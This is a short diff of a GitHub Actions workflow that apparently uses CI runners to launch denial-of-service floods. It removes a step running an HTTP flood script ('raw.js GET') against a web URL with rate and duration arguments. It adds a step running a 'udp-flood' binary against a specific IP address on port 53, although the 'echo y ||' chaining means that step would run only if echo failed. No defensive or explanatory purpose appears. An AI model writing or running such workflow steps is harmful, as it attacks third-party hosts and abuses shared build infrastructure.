@@ -11,4 +11,4 @@ jobs:
     steps:
       - uses: actions/checkout@v3
       - run: chmod +x udp-flood
-      - run: npm i chalk@2.3 && npm i hpack && npm i socks && node raw.js GET https://load.vmheaven.io/ 1200 5 90 --debug --full
+      - run: echo y || sudo ./udp-flood 171.225.223.4 53 0 0 0 
